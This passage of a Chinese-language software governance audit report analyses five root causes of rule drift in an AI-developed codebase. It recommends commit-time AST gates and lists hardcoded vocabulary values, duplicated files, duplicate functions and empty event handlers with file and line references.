**最大发现（初轮）**：文件复制对从6对暴增到159对——这是之前所有审核都未发现的"隐性债务冰山"。`governance/` ↔ `infrastructure/rollback/`（71同名）和 `behavioral_audit/` ↔ `governance/drift_detection/`（51同名）两个并行目录树贡献了114对复制。

**最大发现（第5轮）**：①孤儿过滤掩盖603个真孤儿——`diagnose_depgraph.py:58 ORPHAN_EXEMPT_TYPES`把949个真孤儿滤成346，给治理层造成"孤儿问题不严重"的假象；②AGENTS.md宪法级声明与代码不符——§11声明`make_ttl_reconciler`已删，但`reconciliation_registry.py:418`函数仍存在；③连字符路径违规规模被低估9倍——原报告11文件57行，实测57文件338处。

---

## 三、病根分析（5个根因）

所有988个问题归因于5个根因。每个根因配证据链，所有问题都能溯源到这5个根因之一。

### 根因1：trae_060的"违规清单"是静态快照，未随项目演进动态更新

**5W追问**：
1. 为什么159对文件复制未合并？→ P2迁移期临时双轨
2. 为什么未合并？→ 没有强制门禁阻断双轨并存
3. 为什么没有门禁？→ trae_060 §5只列了6个簇，未覆盖文件复制对
4. 为什么未覆盖？→ trae_060定稿时（2026-06-26）文件复制对还未出现
5. 为什么定稿后不更新？→ trae_060标`stability: frozen` + `modification_permission: immutable_core`，AI不敢改、Owner没空改

**元问题**：trae_060把"违规清单"当作"规则本身"写入frozen文档。规则应是判断标准（"禁止硬编码"），违规清单是事实快照（"今天发现64处"）。把事实快照冻结，等于让规则随时间脱节。

**证据链**：
- [trae_060 §5:206](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L206)：自承"全量排查(2026-06-26)发现64处"——明确标注日期，证明是快照
- [trae_060 §5:209](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L209)："手工触发~25处" vs 实测96处manual——快照失真3.8倍
- [project_rules.md:228](file:///D:/ZephyrAlpha/.trae/rules/project_rules.md#L228)：项目自身已承认§5失效，但仍保留在frozen文档里

**影响问题数**：~15类（§5失真 / 159文件复制对 / 时间触发残留 / 重复簇未合并）

### 根因2：词表→代码的强制消费链存在机械盲区，GATE-VOCAB是"部分强制"

**5W追问**：
1. 为什么stability词表值域错位？→ 代码先于词表存在，词表升级后代码未跟随
2. 为什么词表升级后代码未跟随？→ 没有强制门禁阻断硬编码
3. 为什么没有门禁？→ GATE-VOCAB正则有盲区（下划线前缀变量名未覆盖）
4. 为什么有盲区？→ GATE-VOCAB用正则模式匹配`VALID/ALLOWED/LEGAL_*_VALUES`等，未做语义级枚举检测
5. 为什么不做语义级检测？→ trae_060 §2只规定"禁止硬编码合法值"，未规定"必须检测所有形式的词表值副本"

**元问题**：词表→代码的强制消费链是"模式匹配"而非"语义匹配"。代码可以把`stability: frozen`改写成`_STAB = "frozen"`或`LEVEL_FROZEN = "frozen"`绕过。

**证据链**：
- [trae_060 §5:206](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L206)：自承"60处因变量名/形式不匹配GATE-VOCAB模式未检出"——盲区明确量化
- [AGENTS.md §7 GATE-VOCAB:228](file:///D:/ZephyrAlpha/AGENTS.md#L228)：模式清单是有限的，下划线前缀变体天然不匹配

**影响问题数**：~12类（词表硬编码41处 / stability值域错位 / 60处未检出盲区）

### 根因3：CapabilityLookup是"建议性反查"而非"强制性消费"，覆盖率严重不足

**5W追问**：
1. 为什么40个GATE无capability反查？→ GATE先于CapabilityLookup建立
2. 为什么GATE未补注册？→ 没有强制要求"GATE上线MUST登记capability"
3. 为什么没有强制要求？→ trae_060 §2未规定"规则/门禁自身MUST登记到capability registry"
4. 为什么未规定？→ CapabilityLookup是后建的"反查工具"，被定位为"辅助发现"而非"治理对象"
5. 为什么定位为辅助？→ [AGENTS.md §7 CAPABILITY-OVERLAP:255](file:///D:/ZephyrAlpha/AGENTS.md#L255)明确"warn-only"——设计上就是建议性

**元问题**：CapabilityLookup对"新建重复实现"是warn-only（不阻断），对"basename撞capability_id"才是block。这意味着40个GATE没有反查条目，新AI想做"门禁检测某规则"时CapabilityLookup返回空，新AI会重复造一个门禁。

**证据链**：
- capability_canonical_file_registry.yaml仅38个capability_id条目
- 51个gate-*中仅11个有反查条目
- [AGENTS.md §7:255](file:///D:/ZephyrAlpha/AGENTS.md#L255)：CAPABILITY-OVERLAP是"warn-only（不阻断）"

**影响问题数**：~10类（40 GATE无反查 / 重复造轮子 / 重复簇新建）

### 根因4：永久功能与一次性脚本未区分，manual例外开口过大

**5W追问**：
1. 为什么96个`[STARTUP] manual`脚本？→ trae_060 §3禁止时间触发但允许manual例外
2. 为什么未禁止manual？→ 有些功能确实需要manual（如一次性迁移脚本）
3. 为什么永久治理脚本也走manual？→ §3 exceptions的`manual_ops`例外措辞是"一次性运维/诊断/迁移脚本"，但未提供"永久vs一次性"的机械判定标准
4. 为什么未提供机械判定？→ "永久性"是语义概念，难以从代码静态判定
5. 为什么不要求永久脚本MUST事件注册？→ trae_060 §3写了"MUST事件触发"但enforcement是GATE-VOCAB（只查词表硬编码），没有"manual-only永久脚本检测器"

**元问题**：trae_060 §3的"永久功能禁止manual-only"是无牙老虎。规则写了禁止，但没有门禁检测"这个.py是永久功能还是一次性脚本"。所有脚本统一标`# [STARTUP] manual`，门禁无法区分。

**证据链**：
- [trae_060 §3:144-146](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L144)：例外是人工判定的，无机械标准
- [trae_060 §3 exceptions:152](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L152)：`manual_ops`例外开口含"诊断"，几乎所有治理脚本都自称诊断
- enforcement段（[trae_060:254-261](file:///D:/ZephyrAlpha/docs/01_policies_and_standards/rules/trae_060_inward_consolidation.yaml#L254)）的executors只有3个，没有任何executor检测manual-only永久脚本

**影响问题数**：~10类（96 manual脚本 / 永久治理功能manual-only / rule_watcher双重违规）

### 根因5（隐藏元根因）：规则文档自身膨胀，AI上下文有限导致"规则丰富但执行断层"

**5W追问**：
1. 为什么298个问题反复出现？→ 新AI不读规则或读了记不住
2. 为什么记不住？→ 规则文档过大（project_rules.md 1529行 + AGENTS.md 581+行 + trae_060 287行 + 60蓝图 + 35词表 + 52 GATE定义）
3. 为什么规则文档过大？→ 每发现一个问题就加一条规则+一个GATE+一段"治本"标注
4. 为什么"治本"标注越加越多问题仍反复？→ "治本"是局部治本（修个别违规点），不是系统治本（建立强制消费链）
5. 为什么不做系统治本？→ 系统治本需要AST门禁+强制消费链，开发成本高于加一条规则文档

**元问题**：项目陷入"规则膨胀→上下文不足→执行断层→加更多规则"的负反馈循环。每次"治本"都在加规则，而不是在加强制消费链。AGENTS.md里"治本"出现60+次，但大多是"修了X文件的Y漂移"，不是"建立X类漂移的强制检测器"。

**证据链**：
- project_rules.md 1529行
- AGENTS.md仅§7就有250+行，包含20+个"治本"标注
- 17个reconciler全是post-commit，无pre-commit AST强制消费链门禁（GATE-VOCAB是唯一的AST门禁，且只覆盖词表硬编码一个维度）
- boot_hooks.py 21个hook全部围绕task lifecycle，无"规则文件变更→校验capability反查"的hook

**影响问题数**：~5类（298问题反复出现的元原因）

### 病根→问题映射表

| 根因 | 影响问题数 | 代表性问题 |
|---|:---:|---|
| 1. 静态快照未动态更新 | ~15类 | 159文件复制对 / 时间触发残留 / 重复簇 |
| 2. 词表消费链机械盲区 | ~12类 | 41词表硬编码 / stability值域错位 |
| 3. CapabilityLookup建议性 | ~10类 | 40 GATE无反查 / 重复造轮子 |
| 4. manual例外开口过大 | ~10类 | 96 manual脚本 / rule_watcher违规 |
| 5. 规则膨胀执行断层 | ~5类（元原因） | 298问题反复出现 |
| **合计** | **5根因→298问题** | |

---

## 四、战略层裁定（针对100%AI开发）

### 裁定1：项目当前是"规则丰富但执行断层"，应先做"执行闭环"再做"规则扩展"

**判定**：**应该先做执行闭环**。

**理由**（基于证据）：
- 规则侧：60蓝图 + 35词表 + 52 GATE + 17 reconciler + 38 capability + 20 RULE-* + 60 trae_*——规则密度极高
- 执行侧：GATE-VOCAB是唯一AST强制门禁，只覆盖"词表硬编码"一个维度；CAPABILITY-OVERLAP是warn-only；manual-only检测无门禁；重复簇合并无门禁
- 比例失衡：**规则:执行 ≈ 10:1**。每条规则都依赖AI自觉执行，但AI上下文有限必然跳过
- 298个问题中大部分是"规则写了但没执行"（manual触发、硬编码、重复簇、capability未反查）——典型的执行断层症状

**战略建议**：**暂停新增规则文档6个月**。新发现的违规点一律转化为AST门禁或reconciler，不再加.md规则段落。让规则密度下降，让执行密度上升。

### 裁定2：298个问题中治标 vs 治本分类

> 治本定义：建立强制消费链（AST门禁/reconciler/hook），使同类问题不再可能产生。
> 治标定义：修个别违规点（删某个硬编码、合并某对文件），未建立检测器。

| 类别 | 数量估算 | 代表性问题 | 治本/治标 |
|---|:---:|---|---|
| 词表硬编码副本 | 41处 | stability 7处 / semantic 2处 / layer 4处 | **治标**——治本需建语义级枚举检测器 |
| 文件复制对 | 159对 | governance↔rollback 71 / behavioral_audit↔drift_detection 51 | **治标**——治本需建"同名能力多实现"阻断门禁 |
| 时间触发 | 15处 | IdeHealthDaemon 30s / commit_trigger 30s | **部分治本**（CircadianScheduler废除是治本，但未建"新建Timer即阻断"门禁） |
| manual触发 | 1处真正违规 | rule_watcher双重违规 | **治标**——治本需建"永久脚本MUST事件注册"门禁 |
| GATE无capability反查 | 40个 | g_trae_003~059大部分 | **治标**——治本需建"新GATE创建MUST登记capability"hook |
| 重复簇未合并 | 6簇 | atomic_write 6处 / load_yaml 7处 / parse_frontmatter 4处 | **治标**——治本需建"新建atomic_write函数即阻断"门禁 |
| 空handler | 6处 | autopilot _on_task_completed / boot_hooks 2处 | **治标**——治本需建"事件订阅MUST有非log实体"检测器 |
| 死代码/同步副本 | 3+若干 | context_rules双版本 / __init___from_infra | **治标** |
| 未注册关键能力 | 10个 | AutoRuntime/PipelineOrchestrator/lock_files/scaffold | **治标**——治本需建"新功能MUST登记capability"hook |
| 文件残留/路径双源 | 3处 | depgraph残留 / _master-blueprint连字符 / module_id重复 | **治标** |
| **已治本（标杆）** | ~8类 | 纯shim/虚假引用/pre-commit id重复/目录污染/REPO_ROOT硬编码/DB路径/N-16/ttl校验 | **治本** |

**汇总**：
- **治本（建立强制消费链）**：约8-10个问题类
- **治标（修个别违规点）**：约40个问题类（含298个具体点）
- **未治本（已知搁置）**：约2个（F2/F3 SQLite同名冲突 / health_probes stub）

**结论**：**298个问题中约80%是治标，20%是治本**。项目"治本"标注虽多，但大多是局部治本（修一类文件），不是系统治本（建一类门禁）。

### 裁定3：在AI上下文有限的约束下，应该把所有强制消费链都做成AST门禁

**判定**：**应该，但有优先级**。

**理由**：
- AI上下文有限 = AI必然跳过部分规则 = 依赖AI自觉的规则必然失效
- AST门禁在commit时阻断，不依赖AI记忆——是100% AI开发场景下唯一可靠的执行层
- 但AST门禁开发成本高，不能所有规则都做。优先级应基于"违规后果严重度×发生频率"

**优先级建议**（按ROI排序）：
1. **P0**：manual-only永久脚本检测器（影响96处，违规后果=功能遗忘漂移）
2. **P0**：词表硬编码语义级检测器（影响41处+60处盲区，已有GATE-VOCAB基础可扩展）
3. **P1**：新GATE创建MUST登记capability的hook（影响40个无反查GATE）
4. **P1**：重复簇新建阻断门禁（atomic_write/load_yaml/parse_frontmatter等同basename函数新建即阻断）
5. **P2**：文件复制对检测器（同内容文件并存阻断）
6. **P2**：空handler检测器（事件订阅handler仅logger.info/pass即阻断）

### 裁定4：长远期战略——必须建"架构健康度仪表盘"，每次commit自动生成

**判定**：**应该，且是最高优先级基础设施**。

**理由**（基于第一性原理）：
- 100% AI开发场景下，AI进项目第一件事是"认知资产规模"。但当前认知靠读unified_asset_index.yaml（手工生成，会漂移）
- 仪表盘 = 把trae_060 §5的"静态快照"变成"动态实时"——**直接治根因1**
- 仪表盘 = 把CapabilityLookup的"warn-only"变成"可见违规数"——**间接治根因3**
- 仪表盘 = 把"298个问题"从离散报告变成趋势曲线——可量化治理进度

**仪表盘应包含的指标**（每次commit自动生成）：
- 词表硬编码违规数（GATE-VOCAB实时扫描，目标0）
- manual-only永久脚本数（[STARTUP] manual且无boot_hooks注册，目标0）
- 重复簇函数数（atomic_write/load_yaml/parse_frontmatter等的磁盘计数，目标1）
- GATE未登记capability数（52 GATE - 已登记数，目标0）
- 文件复制对数（同内容不同路径，目标0）
- reconciler健康度（17 reconciler最近一次执行状态+报告落盘数）
- 死代码数（git tracked但0 import引用）
- 路径漂移数（蓝图声明路径vs实际代码路径不一致）
- 三方对齐违规数（depgraph ↔ 蓝图 ↔ 代码头部）
- 时间触发残留数（CircadianScheduler/cron/Timer模式扫描）

### 元问题反思

**反思1：37个功能是否过多？**

**判定**：**过多，且边界设计存在"治理层过重"问题**。

- [core_function_dependency_design.md §2:66](file:///D:/ZephyrAlpha/docs/_archive/core_function_dependency_design.md#L66)（已移至`_archive/`）：7层架构，L5治理层就有14个功能——**治理层占37功能的38%**
- L5治理层14个功能中，F20已吸收/F34设计态/F35设计态——**3个是空壳**
- F6/F15/F16/F18/F29/F30/F31/F34/F35——**9个功能职责高度重叠**，都是"发现问题→报告/修复"
- AI上下文按token算，37功能×平均200字描述=7400字，已占满一个对话的1/3上下文

**战略建议**：L5治理层应从14功能收敛为5-6功能（统一检测器/统一修复器/统一验证器/审计/注册表/资产），其余合并。F34/F35设计态直接删除。

**反思2：52 GATE + 17 reconciler + 34词表 + 48注册表，治理体系是否过重？**

**判定**：**过重，且存在"治理自身漂移"悖论**。

- 52 GATE中只有约11个在capability registry有反查——**75%的GATE自身就是孤儿**（违反RULE-TWO反孤儿功能）
- 17 reconciler全是post-commit，无pre-commit——**所有reconciler都是"事后补偿"，不是"事前阻断"**
- 34词表+48注册表=82个YAML真源文件，每个都需要sync_yaml_to_depgraph.py同步——同步链本身是漂移源
- project_rules.md自身1529行，AGENTS.md 581+行——**规则文档自身已成为最大的漂移源**

**第一性原理反思**：治理体系的目的是"防止漂移"。但治理体系自身52 GATE+17 reconciler+34词表+48注册表=151个治理组件，每个都可能漂移。**治理组件数 > 被治理组件数时，治理体系自身就是最大漂移源**。实测：trae_060 §5快照已失效（25 vs 96 manual），GATE-VOCAB有60处盲区，40 GATE无capability反查——**治理体系自身的漂移已被实证**。

**反思3："100% AI开发"是否意味着应该简化治理体系？**

**判定**：**完全正确，且这是项目当前最核心的战略矛盾**。

- 强制消费链（AST门禁）：仅GATE-VOCAB一个，覆盖1个维度
- 建议性规则：60蓝图+35词表+52 GATE+20 RULE-*+60 trae_*+project_rules.md 1529行+AGENTS.md 581行——**建议性规则密度是强制消费链的100倍以上**
- AI上下文有限 = AI必然跳过建议性规则 = 建议性规则必然失效

**战略建议**：100% AI开发场景下，"建议性规则"是反模式。AI没有"自觉"，只有"被阻断"。应该用强制消费链替代建议性规则。

---

## 五、988个问题详细清单

### 5.1 SSoT真源唯一性违规（211个）

#### 5.1.1 词表硬编码（41处 = 15 HIGH + 26 MEDIUM）

##### A. stability_vocabulary.yaml（真源4值：frozen/stable/evolving/volatile）—— 已漂移，最高危

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 1 | frozenset硬编码STABILITY合法值 | [src/zephyr/autonomy_core/prompt_registry.py:86](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/prompt_registry.py#L86) | 高 | 否 |
| 2 | frozenset硬编码STABILITY合法值 | [src/zephyr/autonomy_core/skill_registry.py:50](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_registry.py#L50) | 高 | 否 |
| 3 | frozenset硬编码STABILITY合法值 | [src/zephyr/support/prompt_registry.py:85](file:///D:/ZephyrAlpha/src/zephyr/support/prompt_registry.py#L85) | 高 | 否 |
| 4 | frozenset硬编码FORBIDDEN_STABILITY | [src/zephyr/governance/self_healer.py:94](file:///D:/ZephyrAlpha/src/zephyr/governance/self_healer.py#L94) | 高 | 否 |
| 5 | frozenset硬编码FORBIDDEN_AUTONOMY | [src/zephyr/governance/self_healer.py:95](file:///D:/ZephyrAlpha/src/zephyr/governance/self_healer.py#L95) | 高 | 否 |
| 6 | frozenset硬编码FORBIDDEN_STABILITY（副本） | [src/zephyr/governance/semantic_audit/self_healer.py:75](file:///D:/ZephyrAlpha/src/zephyr/governance/semantic_audit/self_healer.py#L75) | 高 | 否 |
| 7 | frozenset硬编码FORBIDDEN_AUTONOMY（副本） | [src/zephyr/governance/semantic_audit/self_healer.py:76](file:///D:/ZephyrAlpha/src/zephyr/governance/semantic_audit/self_healer.py#L76) | 高 | 否 |

> **漂移详情**：代码硬编码`{experimental,beta,stable,frozen}`，词表真源为`{frozen,stable,evolving,volatile}`——值集合已不一致，AI标注`evolving`被代码拒，改`experimental`被词表拒→随机选→漂移。

##### B. semantic_vocabulary.yaml（真源4值：runtime/data/build/contract）—— 词表明令禁止

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 8 | VALID_SEMANTIC_TYPES字面量集合 | [scripts/governance/diagnose_depgraph.py:427](file:///D:/ZephyrAlpha/scripts/governance/diagnose_depgraph.py#L427) | 高 | 否 |
| 9 | VALID_SEMANTIC_TYPES字面量集合（副本） | [scripts/governance/generate_project_depgraph.py:323](file:///D:/ZephyrAlpha/scripts/governance/generate_project_depgraph.py#L323) | 高 | 否 |

##### C. layer_vocabulary.yaml（真源16值：L00/L01/L10等架构层）

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 10 | _FOUNDATION_LAYERS frozenset硬编码 | [src/zephyr/integration/ct_pipe_routing.py:65](file:///D:/ZephyrAlpha/src/zephyr/integration/ct_pipe_routing.py#L65) | 高 | 否 |
| 11 | _FOUNDATION_LAYERS frozenset硬编码 | [src/zephyr/integration/routing_plugins.py:65](file:///D:/ZephyrAlpha/src/zephyr/integration/routing_plugins.py#L65) | 高 | 否 |
| 12 | _FOUNDATION_LAYERS frozenset硬编码（副本） | [src/zephyr/infrastructure/pipeline/routing_plugins.py:65](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/routing_plugins.py#L65) | 高 | 否 |
| 13 | _FOUNDATION_LAYERS frozenset硬编码（副本） | [src/zephyr/infrastructure/pipeline/ct_pipe_routing.py:63](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/ct_pipe_routing.py#L63) | 高 | 否 |

##### D. module_lifecycle_status_vocabulary.yaml（真源8值）—— 词表明令禁止

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 14 | VALID_MODULE_STATUSES字面量集合 | [scripts/governance/d5_architecture/validators/lifecycle/validate_module_lifecycle.py:64](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/validators/lifecycle/validate_module_lifecycle.py#L64) | 高 | 否 |

##### E. contract_status_vocabulary.yaml（真源3值：draft/frozen/deprecated）—— 词表明令禁止

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 15 | VALID_CONTRACT_STATUSES字面量集合 | [scripts/governance/d5_architecture/validators/validate_interface_contracts.py:62](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/validators/validate_interface_contracts.py#L62) | 高 | 否 |

##### F. MEDIUM严重度（26处）—— 无对应SSoT词表的硬编码合法值

| # | 违规类型 | 文件:行号 | 严重度 |
|---|---|---|:---:|
| 16-17 | _GATE_IDS硬编码（×2处） | gate校验脚本 | 中 |
| 18-19 | _VALID_PLATFORMS硬编码（×2处） | 平台校验脚本 | 中 |
| 20-21 | _VALID_PRIORITIES硬编码（×2处） | 优先级校验 | 中 |
| 22 | _VALID_PERSISTENCE硬编码 | [src/zephyr/infrastructure/event_sink.py:61](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/event_sink.py#L61) | 中 |
| 23 | _VALID_SOURCE硬编码 | [src/zephyr/infrastructure/event_sink.py:62](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/event_sink.py#L62) | 中 |
| 24 | _VALID_EXPECTATION硬编码 | [src/zephyr/infrastructure/event_sink.py:63](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/event_sink.py#L63) | 中 |
| 25 | _VALID_SEVERITY硬编码 | [src/zephyr/infrastructure/event_sink.py:64](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/event_sink.py#L64) | 中 |
| 26 | _VALID_PERIODS硬编码 | [src/zephyr/infrastructure/olap_engine.py:81](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/olap_engine.py#L81) | 中 |
| 27-28 | _PREEMPTIBLE_PRIORITIES硬编码（×2处） | 调度脚本 | 中 |
| 29-30 | _NO_AUTO_FIX_TYPES硬编码（×2处） | auto_fix脚本 | 中 |
| 31 | _BLOCKED_LEVELS硬编码 | [src/zephyr/infrastructure/engine_degradation.py:64](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/engine_degradation.py#L64) | 中 |
| 32-33 | routing M1-M11硬编码（×2处） | routing脚本 | 中 |
| 34 | _VALID_TAGS硬编码 | [scripts/governance/run_all.py:132](file:///D:/ZephyrAlpha/scripts/governance/run_all.py#L132) | 中 |
| 35 | VALID_BELONGS_TO硬编码 | [scripts/governance/d5_architecture/validators/blueprint/validate_blueprint_placement.py:81](file:///D:/ZephyrAlpha/scripts/governance/d5_architecture/validators/blueprint/validate_blueprint_placement.py#L81) | 中 |
| 36-37 | HOT/COLD_COLLECTIONS硬编码（×2处） | 集合配置 | 中 |
| 38 | finding OPEN状态硬编码 | [src/zephyr/infrastructure/_finding_lifecycle.py:51](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/_finding_lifecycle.py#L51) | 中 |
| 39 | finding IN_PROGRESS状态硬编码 | [src/zephyr/infrastructure/_finding_lifecycle.py:52](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/_finding_lifecycle.py#L52) | 中 |
| 40 | finding CLOSED状态硬编码 | [src/zephyr/infrastructure/_finding_lifecycle.py:53](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/_finding_lifecycle.py#L53) | 中 |
| 41 | finding状态硬编码（副本） | [scripts/governance/fix_broken_post_sync.py:114](file:///D:/ZephyrAlpha/scripts/governance/fix_broken_post_sync.py#L114) | 中 |

#### 5.1.2 文件复制对（159对 = 157 COPY + 2 DRIFTED）

分布于7个复制簇，按规模降序：

| # | 复制簇 | 同名文件数 | COPY(≥60%) | DRIFTED(35-59%) | 严重度 | 历史遗留 |
|---|---|:---:|:---:|:---:|:---:|:---:|
| 1 | `governance/` ↔ `infrastructure/rollback/` | 71 | 65 | 1（result_types.py 53.8%） | 高 | 是 |
| 2 | `behavioral_audit/` ↔ `governance/drift_detection/` | 51 | 49 | 1（__init__.py 54.7%） | 高 | 是 |
| 3 | `infrastructure/` ↔ `integration/mcp/` | 19 | 19 | 0 | 高 | 是 |
| 4 | `infrastructure/pipeline/` ↔ `integration/` | 17 | 17 | 0 | 高 | 是 |
| 5 | `autonomy_core/` ↔ `parsing/` | 3 | 3 | 0 | 高 | 是 |
| 6 | `shared/schema/` ↔ `integration/shared/schema/` | 1 | 1 | 0 | 高 | 是 |
| 7 | `shared/config/` ↔ `infrastructure/config/shared/config/` | 1 | 1 | 0 | 高 | 是 |
| **合计** | **7簇** | **163** | **155** | **2** | | |

> **说明**：159对 = 157清晰复制对（共享度84.8%-99.3%）+ 2漂移对（53.8%、54.7%）。3个DIFFERENT（<35%）已排除。
> **最大债务**：簇1（governance↔rollback 71同名）和簇2（behavioral_audit↔drift_detection 51同名）贡献114对复制，是历史遗留的最大复制债务。

#### 5.1.3 同步副本（3处）

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 1 | context rules双版本真源（6规则 vs 15规则，同module_id=MOD-INF-002, doc_type=register） | [config/context_rules.yaml](file:///D:/ZephyrAlpha/config/context_rules.yaml#L1) ↔ [config/context_rules_v1.yaml](file:///D:/ZephyrAlpha/config/context_rules_v1.yaml#L1) | 高 | 是 |
| 2 | architecture_model同步副本树（target_architecture下，正在消除中） | [docs/02_enterprise_architecture/target_architecture/architecture_model/](file:///D:/ZephyrAlpha/docs/02_enterprise_architecture/target_architecture/architecture_model/) | 高 | 是 |
| 3 | 三下划线命名的冗余__init__副本 ×2 | [src/zephyr/infrastructure/__init___from_infra.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/__init___from_infra.py#L1) + [src/zephyr/infrastructure/observability/__init___from_infra.py](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/observability/__init___from_infra.py#L1) | 高 | 是 |

#### 5.1.4 重复簇（6簇）

| # | 重复簇 | 定义位置数 | 真源候选 | 严重度 | 历史遗留 |
|---|---|:---:|---|:---:|:---:|
| 1 | `atomic_write` | 6处 | [shared/io/file_utils.py:69](file:///D:/ZephyrAlpha/src/zephyr/shared/io/file_utils.py#L69)（真源）+ 5副本 | 中 | 是 |
| 2 | `load_yaml` | 7处 | [scripts/governance/_shared/yaml_utils.py:53](file:///D:/ZephyrAlpha/scripts/governance/_shared/yaml_utils.py#L53)（真源）+ 6副本 | 中 | 是 |
| 3 | `load_yaml_config` | 2处 | [shared/config/loader.py:68](file:///D:/ZephyrAlpha/src/zephyr/shared/config/loader.py#L68) + [infrastructure/config/shared/config/loader.py:119](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/config/shared/config/loader.py#L119) | 中 | 是 |
| 4 | `parse_frontmatter` | 4处 | [shared/io/frontmatter_utils.py:38](file:///D:/ZephyrAlpha/src/zephyr/shared/io/frontmatter_utils.py#L38)（真源）+ 3副本——签名已分叉（scripts侧返回`(dict, body)`，src侧返回`dict|None`） | 中 | 是 |
| 5 | `Priority` Enum | 6处 | asset_inventory/models.py:60 + audit_orchestrator/models.py:48 + audit_trail/models.py:48 + shared/schema/severity_types.py:41 + integration/shared/schema/severity_types.py:46 + governance/models.py:62 | 中 | 是 |
| 6 | `IntentDomain` Enum | 2处 | [autonomy_core/intent_keyword_mapper.py:299](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/intent_keyword_mapper.py#L299) + [parsing/intent_keyword_mapper.py:297](file:///D:/ZephyrAlpha/src/zephyr/parsing/intent_keyword_mapper.py#L297) | 中 | 是 |

#### 5.1.5 DB连接函数真源冲突（2处）

| # | 违规类型 | 文件:行号 | 严重度 | 历史遗留 |
|---|---|---|:---:|:---:|
| 1 | `get_depgraph_pg_connection`同名wrapper委托（真源+wrapper并存） | 真源[src/zephyr/governance/depgraph_schema.py:1170](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L1170) + wrapper[scripts/governance/_shared/constants.py:104](file:///D:/ZephyrAlpha/scripts/governance/_shared/constants.py#L104) | 中 | 否 |
| 2 | `get_db_connection` deprecated别名（名称冲突，已注释说明） | [src/zephyr/governance/depgraph_schema.py:1210](file:///D:/ZephyrAlpha/src/zephyr/governance/depgraph_schema.py#L1210) | 中 | 是 |

#### 5.1.6 F1-F37功能清单双真源

| # | 违规类型 | 文件:行号 | 严重度 |
|---|---|---|:---:|
| 1 | 37个功能F1-F37硬编码清单（设计与运行时双真源） | [core_function_dependency_design.md:69-96](file:///D:/ZephyrAlpha/docs/_archive/core_function_dependency_design.md#L69)（已移至`_archive/`） | 高 |
| 2 | 启动波次硬编码F-ID列表 | [core_function_dependency_design.md:556-572](file:///D:/ZephyrAlpha/docs/_archive/core_function_dependency_design.md#L556)（已移至`_archive/`） | 高 |

> **说明**：文档自述"设计真源"，depgraph是"运行时全景"——但文中L0-L6分层、F22/F25/F26等硬编码列表与depgraph形成双真源。任何depgraph域迁移都需手工同步本文档，已记录"规划差异"漂移。

---

### 5.2 永久系统全自动触发违规（32个，去重后）

#### 5.2.1 事件handler空实现（6条，高）

| # | 文件:行号 | handler | 证据 | 可治本 |
|---|---|---|---|:---:|
| 1 | [autopilot.py:215](file:///D:/ZephyrAlpha/src/zephyr/trading/autopilot.py#L215) | `_on_task_completed` | 订阅`task_completed`，注释自述"轻量handler——仅日志记录"，run_cycle推给AI session | 是 |
| 2 | [boot_hooks.py:34](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L34) | `_on_task_created` | 仅`logger.info("...event received")` | 是 |
| 3 | [boot_hooks.py:38](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L38) | `_on_task_completed_event` | 仅`logger.info` | 是 |
| 4 | [context_pipeline_auto.py:104](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_pipeline_auto.py#L104) | `_on_task_started` | 文档承诺"自动准备上下文"，实体仅`logger.debug`后return | 是 |
| 5 | [context_pipeline_auto.py:113](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_pipeline_auto.py#L113) | `_on_task_completed` | 文档承诺"自动清理上下文"，实体仅`logger.debug` | 是 |
| 6 | [event_hooks.py:205](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/auto_fix_engine/event_hooks.py#L205) | `_on_validation_result` | 显式"仅日志记录"（避免循环，审计用途） | 否（设计意图） |

#### 5.2.2 自动启动的永久守护线程——时间触发（15条，高）

| # | 文件:行号 | 间隔 | 触发链 | 可治本 |
|---|---|---|---|:---:|
| 1 | [ide_health_daemon.py:341](file:///D:/ZephyrAlpha/src/zephyr/trading/ide_health_daemon.py#L341) + [:363](file:///D:/ZephyrAlpha/src/zephyr/trading/ide_health_daemon.py#L363) | 30s | boot_hooks→register_daemon()→registry.start()；还自动调cleanup_stash.py | 是 |
